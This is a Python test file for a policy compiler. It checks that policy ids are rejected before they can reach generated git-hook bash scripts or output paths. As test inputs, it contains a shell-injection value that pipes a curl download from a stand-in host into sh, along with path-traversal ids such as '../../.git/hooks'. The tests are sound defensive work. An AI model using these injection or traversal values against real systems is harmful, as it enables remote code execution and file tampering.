"""A policy id becomes a shell token and a filesystem path in emitted artifacts.

The manifest schema pins `id` to `^[a-z][a-z0-9-]{2,63}$`, but `validate` is a separate
step a drop-in third-party policy never runs -- it reaches the compiler directly, and the
id flows straight into emitted git-hook bash and the compiled output path. These pin the
invariant at the choke points that actually turn an id into a token: compile and add.
"""

from __future__ import annotations

import shutil
from pathlib import Path

import pytest

from chock.compile.compiler import compile_policy
from chock.policy_id import InvalidPolicyId, validate_policy_id
from chock.scaffold.add import _reject_unsafe_id, locate

FRAMEWORK_ROOT = Path(__file__).resolve().parents[1]


def _make_policy(root: Path, folder: str, manifest_id: str) -> Path:
    src = FRAMEWORK_ROOT / ".agents" / "policies" / "protect-main-branch"
    dest = root / folder
    shutil.copytree(src, dest)
    manifest = dest / "manifest.yaml"
    text = manifest.read_text(encoding="utf-8")
    text = text.replace("id: protect-main-branch", f"id: {manifest_id}", 1)
    manifest.write_text(text, encoding="utf-8")
    return dest


def test_validate_policy_id_accepts_the_canonical_shape():
    validate_policy_id("protect-main-branch", "protect-main-branch")


@pytest.mark.parametrize(
    "bad_id",
    [
        'x"; curl evil|sh #',  # shell injection
        "../../.git/hooks",  # path traversal
        "UPPER",  # not the schema shape
        "under_score",
        "a",  # too short
    ],
)
def test_validate_policy_id_rejects_unsafe_ids(bad_id):
    with pytest.raises(InvalidPolicyId):
        validate_policy_id(bad_id, bad_id)


def test_validate_policy_id_requires_folder_match():
    with pytest.raises(InvalidPolicyId):
        validate_policy_id("branch-guard", "protect-main-branch")


def test_compile_refuses_injected_id_and_emits_nothing(tmp_path, capsys):
    # An injected id must not reach the emitted git-hook shim. Compile emits nothing and
    # writes no output directory named after the malicious id.
    policy = _make_policy(tmp_path, "protect-main-branch", 'x"; curl evil|sh #')
    out = tmp_path / "out"
    result = compile_policy(policy, output_root=out, repo_root=tmp_path, agents=["claude"])
    assert result.artifacts == {}
    assert "manifest_id" in capsys.readouterr().err
    # nothing was written under a path derived from the injected id
    assert not any('"' in p.name or ";" in p.name for p in out.rglob("*"))


def test_compile_refuses_traversal_id(tmp_path, capsys):
    policy = _make_policy(tmp_path, "protect-main-branch", "../../pwned")
    out = tmp_path / "out"
    result = compile_policy(policy, output_root=out, repo_root=tmp_path, agents=["claude"])
    assert result.artifacts == {}
    assert not (tmp_path.parent / "pwned").exists()


def test_compile_refuses_id_that_disagrees_with_folder(tmp_path, capsys):
    policy = _make_policy(tmp_path, "branch-guard", "protect-main-branch")
    result = compile_policy(policy, output_root=tmp_path / "out", repo_root=tmp_path, agents=["claude"])
    assert result.artifacts == {}
    assert "does not match its folder name" in capsys.readouterr().err


def test_add_rejects_traversal_artifact_id(tmp_path):
    catalog = tmp_path / "catalog"
    (catalog / "base").mkdir(parents=True)
    for bad in ("../../foo", "a/b", "/abs"):
        with pytest.raises(ValueError, match="single name"):
            locate(catalog, bad)


def test_reject_unsafe_id_allows_a_bare_name():
    _reject_unsafe_id("protect-main-branch")  # no raise


def test_add_registry_path_cannot_escape_catalog(tmp_path):
    # A malicious catalog registry that points `path` outside the clone must not resolve.
    catalog = tmp_path / "catalog"
    catalog.mkdir()
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "manifest.yaml").write_text("id: evil\n", encoding="utf-8")
    (catalog / "registry.yaml").write_text("policies:\n  - id: evil\n    path: ../outside\n", encoding="utf-8")
    with pytest.raises(FileNotFoundError):
        locate(catalog, "evil")
